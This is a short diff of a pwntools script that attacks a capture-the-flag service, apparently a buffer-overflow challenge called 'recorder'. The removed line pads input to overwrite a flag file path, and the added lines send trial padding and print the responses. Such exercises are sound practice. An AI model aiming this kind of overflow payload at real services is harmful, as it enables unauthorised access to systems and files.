@@ -3,11 +3,10 @@ context.arch = 'amd64'
 host = "ctf.adl.tw"
 port = 11005
 r = remote(host, port)
-#r = process("./recorder")
 r.recvuntil(b'Enter your passcode:')
 r.send(b"A"*4)
-r.recvuntil(b"Provide the result in CSV format:")
-attack = "A" * 0x14 + "/home/helloctf/flag"
+print(r.recvuntil(b"Provide the result in CSV format:"))
+attack = b"A" * 0x10 + b"B"*10
 r.send(attack)
-r.recv()
+print(r.recv())
 r.interactive()
